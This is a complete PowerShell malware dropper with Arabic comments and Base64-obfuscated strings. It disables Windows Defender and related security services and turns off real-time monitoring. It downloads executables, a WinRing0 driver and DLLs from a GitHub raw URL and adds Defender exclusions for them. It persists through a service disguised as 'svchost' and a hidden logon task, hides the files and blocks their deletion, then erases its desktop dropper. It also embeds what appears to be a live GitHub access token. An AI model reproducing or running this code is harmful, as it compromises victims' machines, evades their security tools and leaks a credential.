param (
    [string]$dummyParam = ""
)

try {
    $scriptPath = $MyInvocation.MyCommand.Path
    if ([string]::IsNullOrEmpty($scriptPath)) { $scriptPath = ([System.AppDomain]::CurrentDomain.BaseDirectory) }
    $workingDir = Split-Path $scriptPath -Parent
    Set-Location -Path $workingDir
} catch { }

$token = "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"

function Decode-String {
    param (
        [string]$encoded
    )
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
}

function Execute-Command {
    param (
        [string]$encodedCommand
    )
    Invoke-Expression (Decode-String $encodedCommand)
}

function Invoke-PhaseOne {
    $services = @("V2luRGVmZW5k", "U2VjdXJpdHlIZWFsdGhTZXJ2aWNl", "d3Njc3Zj", "U2Vuc2U=")
    foreach ($s in $services) {
        try {
            $serviceName = Decode-String $s
            Stop-Service -Name $serviceName -Force -ErrorAction Stop 2>$null | Out-Null
            Set-Service -Name $serviceName -StartupType Disabled -ErrorAction Stop 2>$null | Out-Null
        } catch { }
    }
    try {
        Execute-Command "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ==" 2>$null | Out-Null
    } catch { }
}

function Get-Path {
    param (
        [string]$type
    )
    if ($type -eq "target") {
        $programDataPath = [Environment]::GetFolderPath("CommonApplicationData")
        return (Join-Path $programDataPath (Decode-String "U3lzdGVtRGF0YQ=="))
    }
    return $env:TEMP
}

function Create-Container {
    param (
        [string]$path
    )
    if (-not (Test-Path $path -ErrorAction SilentlyContinue)) {
        New-Item -ItemType Directory -Path $path -Force 2>$null | Out-Null
    }
}

function Fetch-Resource {
    param (
        [string]$url,
        [string]$destination
    )
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction Stop 2>$null | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Apply-Exclusions {
    param (
        [string]$containerPath,
        [string[]]$resourcePaths
    )
    try { Add-MpPreference -ExclusionPath $containerPath -ErrorAction Stop 2>$null | Out-Null } catch { }
    foreach ($res in $resourcePaths) {
        if (-not [string]::IsNullOrEmpty($res)) {
            try { Add-MpPreference -ExclusionProcess $res -ErrorAction Stop 2>$null | Out-Null } catch { }
        }
    }
}

function Register-Service {
    param (
        [string]$execPath,
        [string]$serviceId,
        [string]$helperPath,
        [string]$serviceDesc
    )
    if (-not (Test-Path $execPath)) { return }

    try {
        if ($serviceId -eq "svcowl") {
            # تسجيل svcowl كمهمة مجدولة بدل الخدمة
            $taskName = $serviceId
                        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -WindowStyle Hidden -Command `"Start-Process -FilePath '$execPath' -Priority RealTime`""

            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

            # حذف المهمة القديمة إن وجدت
            if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
            }

            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $serviceDesc
        }
        else {
            & $helperPath remove $serviceId confirm 2>$null | Out-Null
            & $helperPath install $serviceId $execPath 2>$null | Out-Null
            & $helperPath set $serviceId AppDirectory (Split-Path $execPath) 2>$null | Out-Null
            & $helperPath set $serviceId Description $serviceDesc 2>$null | Out-Null
            & $helperPath set $serviceId AppExit Default Restart 2>$null | Out-Null
            & $helperPath set $serviceId AppRestartDelay 30000 2>$null | Out-Null
            & $helperPath set $serviceId Start SERVICE_AUTO_START 2>$null | Out-Null
            & $helperPath set $serviceId AppStdout "NUL" 2>$null | Out-Null
            & $helperPath set $serviceId AppStderr "NUL" 2>$null | Out-Null
            Start-Service -Name $serviceId -ErrorAction SilentlyContinue 2>$null | Out-Null
        }
    } catch { }
}

function Secure-Payload {
    param (
        [string]$containerPath,
        [string[]]$resourcePaths
    )
    try {
        $folderItem = Get-Item -Path $containerPath -Force
        $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch { }
    foreach ($res in $resourcePaths) {
        if (Test-Path $res) {
            icacls $res /deny "Everyone:(DE,DC)" 2>$null | Out-Null
            try {
                $fileItem = Get-Item -Path $res -Force
                $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
            } catch { }
        }
    }
}

function Initialize-Resources {
    param (
        [string]$containerPath
    )
    $baseUrl = Decode-String "aHR0cHM6Ly9naXRodWIuY29tL0hleVNpbmtlci9ic2JzL3Jhdy9tYWlu"
    $resources = @("Z3Rhdi5leGU=", "Z25zc20uZXhl", "V2luUmluZzB4NjQuc3lz", "Y29uZmlnLmpzb24=", "c2hhMzIuZGxs", "dXYuZGxs", "aW5zdGFsbGVyLmV4ZQ==")
    $fetched = [System.Collections.Generic.List[string]]::new()
    foreach ($res in $resources) {
        if ([string]::IsNullOrWhiteSpace($res)) { continue }
        $fileName = Decode-String $res
        if ([string]::IsNullOrWhiteSpace($fileName)) { continue }
        $filePath = Join-Path $containerPath $fileName
        if (Fetch-Resource -Url "$baseUrl/$fileName" -Destination $filePath) { $fetched.Add($filePath) }
    }
    return $fetched
}

function Start-Execution {
    Invoke-PhaseOne
    $targetPath = Get-Path -type "target"
    Create-Container -Path $targetPath
    Apply-Exclusions -containerPath $targetPath -resourcePaths @()
    $fetchedResources = Initialize-Resources -containerPath $targetPath
    if ($fetchedResources.Count -eq 0) {
        Exit 1
    }

    $helper = Join-Path $targetPath (Decode-String "Z25zc20uZXhl")
    $exec1 = Join-Path $targetPath (Decode-String "Z3Rhdi5leGU=")
    $exec2 = Join-Path $targetPath (Decode-String "aW5zdGFsbGVyLmV4ZQ==")

    Apply-Exclusions -containerPath $targetPath -resourcePaths $fetchedResources

    Register-Service -execPath $exec1 -serviceId "svchost" -helperPath $helper -serviceDesc "Provides essential system process hosting."
    Register-Service -execPath $exec2 -serviceId "svcowl" -helperPath $helper -serviceDesc "System Owl Service for monitoring."
        Start-ScheduledTask -TaskName "svcowl"

    Secure-Payload -containerPath $targetPath -resourcePaths $fetchedResources

    # حذف الملف مؤقتًا بصمت
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $target = Join-Path $desktopPath 'asd.exe'
    $waitSeconds = 1
    $psArgs = "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep -Seconds $waitSeconds; Remove-Item -LiteralPath '$target' -Force -ErrorAction SilentlyContinue`""
    Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -WindowStyle Hidden
}

Start-Execution
